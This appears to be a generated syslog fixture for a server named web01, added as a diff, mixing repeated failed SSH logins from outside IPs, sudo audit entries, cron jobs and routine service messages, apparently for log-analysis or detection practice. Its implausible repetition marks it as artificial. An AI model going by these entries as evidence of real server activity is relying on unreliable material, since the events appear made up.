+Aug 20 02:06:33 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:06:40 web01 systemd[1]: Rotate log files.
+Aug 20 02:06:42 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:06:48 web01 apt[3024]: Cache clean: removing index files
+Aug 20 02:06:54 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:06:57 web01 sshd[1248]: Failed password for invalid user admin from 185.92.220.41 port 41292 ssh2 event=LOGIN_FAILED
+Aug 20 02:07:00 web01 avahi-daemon[510]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:07:04 web01 apt[2694]: Cache clean: removing index files
+Aug 20 02:07:11 web01 apt[2593]: Cache clean: removing index files
+Aug 20 02:07:12 web01 audit[2750]: user=deploy exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:07:14 web01 nginx[2549]: 200 0.548 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:07:20 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:07:22 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:07:26 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:07:32 web01 audit[1827]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:07:38 web01 audit[563]: user=www-data exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:07:40 web01 NetworkManager[660]: DHCPv4 lease renewed on eth0
+Aug 20 02:07:47 web01 CRON[933]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:07:52 web01 sshd[1412]: Failed password for invalid user user from 89.248.165.114 port 45939 ssh2 event=LOGIN_FAILED
+Aug 20 02:07:56 web01 apt[3752]: Cache clean: removing index files
+Aug 20 02:07:57 web01 audit[3078]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:07:59 web01 sshd[1325]: Failed password for invalid user test from 45.155.23.87 port 53476 ssh2 event=LOGIN_FAILED
+Aug 20 02:08:00 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:08:01 web01 NetworkManager[1137]: DHCPv4 lease renewed on eth0
+Aug 20 02:08:08 web01 apt[3982]: Cache clean: removing index files
+Aug 20 02:08:13 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:08:18 web01 sshd[1472]: Accepted publickey for ubuntu from 10.0.5.44 port 60841 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:08:20 web01 sshd[1385]: Failed password for invalid user user from 89.248.165.114 port 44871 ssh2 event=LOGIN_FAILED
+Aug 20 02:08:25 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:08:30 web01 audit[2130]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:08:37 web01 CRON[782]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:08:39 web01 nginx[2103]: 200 0.384 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:08:44 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:08:48 web01 avahi-daemon[390]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:08:52 web01 sshd[1355]: Failed password for invalid user user from 89.248.165.114 port 42884 ssh2 event=LOGIN_FAILED
+Aug 20 02:08:56 web01 nginx[2036]: 200 0.609 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:08:57 web01 postfix/smtpd[2436]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:09:02 web01 systemd[1]: Rotate log files.
+Aug 20 02:09:09 web01 dbus-daemon[1133]: systemd-logind: New session started
+Aug 20 02:09:15 web01 nginx[3151]: 200 0.620 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:09:17 web01 dbus-daemon[967]: systemd-logind: New session started
+Aug 20 02:09:20 web01 postfix/smtpd[2455]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:09:27 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:09:30 web01 systemd[1]: Rotate log files.
+Aug 20 02:09:36 web01 dbus-daemon[1233]: systemd-logind: New session started
+Aug 20 02:09:40 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:09:41 web01 nginx[2597]: 200 0.748 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:09:46 web01 sshd[1184]: Accepted publickey for ubuntu from 10.0.5.23 port 64694 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:09:50 web01 CRON[727]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:09:53 web01 dbus-daemon[692]: systemd-logind: New session started
+Aug 20 02:09:54 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:09:56 web01 sshd[1487]: Failed password for invalid user admin from 185.158.106.77 port 43531 ssh2 event=LOGIN_FAILED
+Aug 20 02:10:00 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:10:07 web01 audit[2797]: user=ubuntu exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:10:12 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:10:16 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:10:21 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:10:26 web01 avahi-daemon[440]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:10:32 web01 systemd[1]: Rotate log files.
+Aug 20 02:10:33 web01 postfix/smtpd[3014]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:10:38 web01 audit[3710]: user=alex exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:10:42 web01 postfix/smtpd[3023]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:10:48 web01 apt[3060]: Cache clean: removing index files
+Aug 20 02:10:52 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:10:56 web01 avahi-daemon[420]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:11:00 web01 dbus-daemon[1407]: systemd-logind: New session started
+Aug 20 02:11:06 web01 sshd[1211]: Accepted publickey for deploy from 10.1.0.12 port 60364 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:11:08 web01 CRON[875]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:11:11 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:11:17 web01 dbus-daemon[1481]: systemd-logind: New session started
+Aug 20 02:11:19 web01 sshd[1280]: Accepted publickey for deploy from 10.0.5.23 port 62464 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:11:24 web01 sshd[1482]: Failed password for invalid user user from 89.248.165.114 port 62093 ssh2 event=LOGIN_FAILED
+Aug 20 02:11:31 web01 sshd[1154]: Accepted publickey for deploy from 10.0.5.23 port 58564 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:11:32 web01 postfix/smtpd[2454]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:11:38 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:11:45 web01 avahi-daemon[496]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:11:51 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:11:57 web01 avahi-daemon[454]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:12:04 web01 systemd[1]: Rotate log files.
+Aug 20 02:12:11 web01 sshd[1480]: Failed password for invalid user user from 185.220.101.17 port 47350 ssh2 event=LOGIN_FAILED
+Aug 20 02:12:17 web01 systemd[1]: Rotate log files.
+Aug 20 02:12:22 web01 avahi-daemon[758]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:12:28 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:12:32 web01 postfix/smtpd[3379]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:12:39 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:12:44 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:12:46 web01 dbus-daemon[1299]: systemd-logind: New session started
+Aug 20 02:12:53 web01 audit[1023]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:12:59 web01 NetworkManager[976]: DHCPv4 lease renewed on eth0
+Aug 20 02:13:06 web01 systemd[1]: Rotate log files.
+Aug 20 02:13:13 web01 apt[2896]: Cache clean: removing index files
+Aug 20 02:13:16 web01 sshd[1188]: Failed password for invalid user user from 45.155.23.87 port 46126 ssh2 event=LOGIN_FAILED
+Aug 20 02:13:22 web01 sshd[1242]: Accepted publickey for deploy from 10.0.5.23 port 57020 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:13:27 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:13:32 web01 audit[1453]: user=root exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:13:36 web01 NetworkManager[758]: DHCPv4 lease renewed on eth0
+Aug 20 02:13:37 web01 CRON[852]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:13:38 web01 apt[3780]: Cache clean: removing index files
+Aug 20 02:13:43 web01 audit[2109]: user=svc.backup exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:13:50 web01 systemd[1]: Rotate log files.
+Aug 20 02:13:51 web01 avahi-daemon[512]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:13:56 web01 CRON[833]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:13:57 web01 avahi-daemon[431]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:14:01 web01 systemd[1]: Rotate log files.
+Aug 20 02:14:02 web01 nginx[2679]: 200 0.318 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:14:05 web01 postfix/smtpd[2623]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:14:12 web01 dbus-daemon[986]: systemd-logind: New session started
+Aug 20 02:14:17 web01 avahi-daemon[682]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:14:18 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:14:22 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:14:23 web01 NetworkManager[928]: DHCPv4 lease renewed on eth0
+Aug 20 02:14:27 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:14:31 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:14:32 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:14:37 web01 avahi-daemon[578]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:14:41 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:14:44 web01 sshd[1375]: Accepted publickey for ubuntu from 10.0.4.17 port 62670 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:14:49 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:14:51 web01 NetworkManager[818]: DHCPv4 lease renewed on eth0
+Aug 20 02:14:58 web01 NetworkManager[706]: DHCPv4 lease renewed on eth0
+Aug 20 02:15:00 web01 sshd[1451]: Accepted publickey for deploy from 10.0.5.23 port 62237 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:15:02 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:15:03 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:15:05 web01 avahi-daemon[635]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:15:06 web01 systemd[1]: Rotate log files.
+Aug 20 02:15:09 web01 postfix/smtpd[2861]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:15:15 web01 postfix/smtpd[2723]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:15:16 web01 postfix/smtpd[2521]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:15:21 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:15:28 web01 apt[2593]: Cache clean: removing index files
+Aug 20 02:15:34 web01 audit[3901]: user=svc.backup exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:15:39 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:15:44 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:15:48 web01 postfix/smtpd[3076]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:15:49 web01 sshd[1482]: Failed password for invalid user user from 185.92.220.41 port 44468 ssh2 event=LOGIN_FAILED
+Aug 20 02:15:53 web01 avahi-daemon[784]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:15:58 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:16:01 web01 NetworkManager[982]: DHCPv4 lease renewed on eth0
+Aug 20 02:16:02 web01 systemd[1]: Rotate log files.
+Aug 20 02:16:03 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:16:08 web01 systemd[1]: Rotate log files.
+Aug 20 02:16:11 web01 CRON[754]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:16:15 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:16:17 web01 CRON[749]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:16:18 web01 CRON[917]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:16:25 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:16:31 web01 systemd[1]: Rotate log files.
+Aug 20 02:16:37 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:16:39 web01 apt[3497]: Cache clean: removing index files
+Aug 20 02:16:42 web01 nginx[2480]: 200 0.787 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:16:43 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:16:45 web01 nginx[2672]: 200 0.561 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:16:50 web01 dbus-daemon[1210]: systemd-logind: New session started
+Aug 20 02:16:55 web01 CRON[906]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:16:58 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:16:59 web01 nginx[2893]: 200 0.326 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:17:02 web01 audit[2883]: user=www-data exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:17:08 web01 nginx[2947]: 200 0.591 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:17:12 web01 nginx[2997]: 200 0.412 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:17:17 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:17:24 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:17:29 web01 CRON[886]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:17:30 web01 audit[2177]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:17:36 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:17:43 web01 systemd[1]: Rotate log files.
+Aug 20 02:17:48 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:17:54 web01 apt[3249]: Cache clean: removing index files
+Aug 20 02:17:58 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:18:00 web01 sshd[1286]: Failed password for invalid user user from 45.155.23.87 port 53001 ssh2 event=LOGIN_FAILED
+Aug 20 02:18:05 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:18:12 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:18:19 web01 sshd[1389]: Accepted publickey for deploy from 10.0.4.17 port 52935 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:18:24 web01 dbus-daemon[1490]: systemd-logind: New session started
+Aug 20 02:18:26 web01 apt[3490]: Cache clean: removing index files
+Aug 20 02:18:29 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:18:31 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:18:33 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:18:38 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:18:42 web01 sshd[1432]: Failed password for invalid user test from 45.155.23.87 port 41307 ssh2 event=LOGIN_FAILED
+Aug 20 02:18:45 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:18:52 web01 apt[3685]: Cache clean: removing index files
+Aug 20 02:18:57 web01 systemd[1]: Rotate log files.
+Aug 20 02:19:03 web01 postfix/smtpd[3001]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:19:09 web01 audit[2216]: user=root exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:19:12 web01 postfix/smtpd[3329]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:19:14 web01 sshd[1346]: Accepted publickey for deploy from 10.0.3.11 port 57976 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:19:19 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:19:23 web01 CRON[831]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:19:29 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:19:31 web01 CRON[869]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:19:33 web01 postfix/smtpd[2738]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:19:39 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:19:43 web01 CRON[865]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:19:50 web01 postfix/smtpd[2649]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:19:51 web01 CRON[734]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:19:57 web01 sshd[1232]: Accepted publickey for ubuntu from 10.0.5.23 port 52725 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:19:59 web01 sshd[1426]: Accepted publickey for deploy from 10.1.0.12 port 59234 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:20:00 web01 audit[2810]: user=deploy exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:20:07 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:20:09 web01 sshd[1212]: Failed password for invalid user test from 89.248.165.114 port 45589 ssh2 event=LOGIN_FAILED
+Aug 20 02:20:16 web01 postfix/smtpd[2546]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:20:23 web01 systemd[1]: Rotate log files.
+Aug 20 02:20:28 web01 dbus-daemon[770]: systemd-logind: New session started
+Aug 20 02:20:30 web01 apt[3201]: Cache clean: removing index files
+Aug 20 02:20:34 web01 systemd[1]: Rotate log files.
+Aug 20 02:20:36 web01 postfix/smtpd[2535]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:20:37 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:20:44 web01 CRON[745]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:20:48 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:20:55 web01 sshd[1437]: Accepted publickey for ubuntu from 10.0.5.23 port 57901 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:20:57 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:21:04 web01 NetworkManager[1041]: DHCPv4 lease renewed on eth0
+Aug 20 02:21:09 web01 sshd[1217]: Failed password for invalid user admin from 185.220.101.17 port 54056 ssh2 event=LOGIN_FAILED
+Aug 20 02:21:16 web01 sshd[1479]: Failed password for invalid user test from 185.158.106.77 port 59301 ssh2 event=LOGIN_FAILED
+Aug 20 02:21:23 web01 avahi-daemon[644]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:21:24 web01 sshd[1219]: Failed password for invalid user test from 89.248.165.114 port 65095 ssh2 event=LOGIN_FAILED
+Aug 20 02:21:31 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:21:34 web01 CRON[847]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:21:39 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:21:43 web01 dbus-daemon[1204]: systemd-logind: New session started
+Aug 20 02:21:50 web01 nginx[2218]: 200 0.470 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:21:52 web01 sshd[1374]: Failed password for invalid user user from 185.158.106.77 port 48562 ssh2 event=LOGIN_FAILED
+Aug 20 02:21:56 web01 systemd[1]: Rotate log files.
+Aug 20 02:22:02 web01 postfix/smtpd[2608]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:22:06 web01 systemd[1]: Rotate log files.
+Aug 20 02:22:08 web01 postfix/smtpd[2968]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:22:12 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:22:17 web01 nginx[2815]: 200 0.822 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:22:23 web01 CRON[891]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:22:25 web01 sshd[1209]: Failed password for invalid user user from 185.92.220.41 port 43285 ssh2 event=LOGIN_FAILED
+Aug 20 02:22:30 web01 postfix/smtpd[2746]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:22:37 web01 systemd[1]: Rotate log files.
+Aug 20 02:22:39 web01 postfix/smtpd[3051]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:22:40 web01 avahi-daemon[771]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:22:42 web01 sshd[1132]: Failed password for invalid user user from 89.248.165.114 port 42888 ssh2 event=LOGIN_FAILED
+Aug 20 02:22:45 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:22:50 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:22:54 web01 dbus-daemon[1033]: systemd-logind: New session started
+Aug 20 02:22:57 web01 NetworkManager[658]: DHCPv4 lease renewed on eth0
+Aug 20 02:23:04 web01 avahi-daemon[677]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:23:08 web01 sshd[1199]: Failed password for invalid user admin from 185.220.101.17 port 49371 ssh2 event=LOGIN_FAILED
+Aug 20 02:23:09 web01 avahi-daemon[611]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:23:14 web01 NetworkManager[773]: DHCPv4 lease renewed on eth0
+Aug 20 02:23:20 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:23:26 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:23:27 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:23:30 web01 NetworkManager[1015]: DHCPv4 lease renewed on eth0
+Aug 20 02:23:35 web01 CRON[888]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:23:41 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:23:46 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:23:49 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:23:51 web01 dbus-daemon[699]: systemd-logind: New session started
+Aug 20 02:23:55 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:23:58 web01 CRON[843]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:23:59 web01 sshd[1362]: Accepted publickey for deploy from 10.0.5.23 port 63155 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:24:02 web01 audit[3349]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:24:07 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:24:11 web01 systemd[1]: Rotate log files.
+Aug 20 02:24:18 web01 nginx[2939]: 200 0.894 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:24:24 web01 sshd[1159]: Failed password for invalid user user from 45.155.23.87 port 55793 ssh2 event=LOGIN_FAILED
+Aug 20 02:24:27 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:24:33 web01 NetworkManager[923]: DHCPv4 lease renewed on eth0
+Aug 20 02:24:37 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:24:43 web01 avahi-daemon[477]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:24:46 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:24:47 web01 systemd[1]: Rotate log files.
+Aug 20 02:24:51 web01 nginx[3174]: 200 0.323 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:24:54 web01 CRON[827]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:25:00 web01 CRON[923]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:25:03 web01 CRON[913]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:25:05 web01 avahi-daemon[532]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:25:07 web01 apt[2745]: Cache clean: removing index files
+Aug 20 02:25:08 web01 NetworkManager[1104]: DHCPv4 lease renewed on eth0
+Aug 20 02:25:13 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:25:20 web01 sshd[1394]: Failed password for invalid user user from 185.158.106.77 port 56133 ssh2 event=LOGIN_FAILED
+Aug 20 02:25:27 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:25:34 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:25:38 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:25:39 web01 sshd[1376]: Accepted publickey for deploy from 10.0.5.44 port 65395 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:25:40 web01 sshd[1161]: Accepted publickey for deploy from 10.0.4.17 port 57490 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:25:46 web01 sshd[1445]: Accepted publickey for deploy from 10.0.5.23 port 50193 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:25:48 web01 postfix/smtpd[2503]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:25:51 web01 postfix/smtpd[3282]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:25:54 web01 CRON[760]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:25:57 web01 sshd[1194]: Failed password for invalid user user from 185.158.106.77 port 51990 ssh2 event=LOGIN_FAILED
+Aug 20 02:26:01 web01 sshd[1305]: Failed password for invalid user test from 185.158.106.77 port 51962 ssh2 event=LOGIN_FAILED
+Aug 20 02:26:04 web01 sshd[1451]: Failed password for invalid user user from 185.92.220.41 port 58870 ssh2 event=LOGIN_FAILED
+Aug 20 02:26:06 web01 avahi-daemon[719]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:26:09 web01 avahi-daemon[634]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:26:13 web01 audit[697]: user=www-data exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:26:20 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:26:24 web01 avahi-daemon[440]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:26:28 web01 sshd[1468]: Failed password for invalid user user from 185.220.101.17 port 57497 ssh2 event=LOGIN_FAILED
+Aug 20 02:26:31 web01 avahi-daemon[503]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:26:34 web01 systemd[1]: Rotate log files.
+Aug 20 02:26:38 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:26:39 web01 CRON[821]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:26:46 web01 dbus-daemon[960]: systemd-logind: New session started
+Aug 20 02:26:52 web01 nginx[2737]: 200 0.469 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:26:57 web01 systemd[1]: Rotate log files.
+Aug 20 02:27:00 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:27:03 web01 audit[914]: user=alex exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:27:08 web01 systemd[1]: Rotate log files.
